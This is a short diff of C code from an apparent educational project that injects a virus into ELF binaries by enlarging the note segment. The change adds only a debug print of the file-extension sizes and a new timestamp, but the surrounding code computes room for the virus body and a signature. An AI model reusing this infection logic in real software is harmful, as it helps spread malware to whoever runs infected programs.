@@ -6,7 +6,7 @@
 /*   By: nguiard <marvin@42.fr>                     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/11/06 09:45:03 by nguiard           #+#    #+#             */
-/*   Updated: 2024/11/21 13:44:35 by nguiard          ###   ########.fr       */
+/*   Updated: 2024/11/25 11:45:03 by nguiard          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -48,6 +48,7 @@ bool	change_note_segment(profiling *this, elf_data *data) {
 
 	(void)note_size;
 
+	
 	note_size = note->p_filesz;
 
 	new_seg_size = note->p_filesz + this->size + SIGNATURE_OFFSET + SIGNATURE_LEN;
@@ -57,6 +58,7 @@ bool	change_note_segment(profiling *this, elf_data *data) {
 	printf("Taille du virus: %lx\nSignature off+len: %x\nAlignement: %lx\n\n", this->size,
 		SIGNATURE_LEN + SIGNATURE_OFFSET, 0x1000 + (new_seg_size % 0x1000));
 
+	printf("\nftruncate: original (%lx) + new_seg_size (%lx) + padding (%lx)\n\n", data->original_size, new_seg_size, 0x1000 - data->original_size % 0x1000);
 	// Extend
 	ftruncate(ret, data->fd, data->original_size + new_seg_size + 0x1000 - (data->original_size % 0x1000));
 	if (ret < 0) {
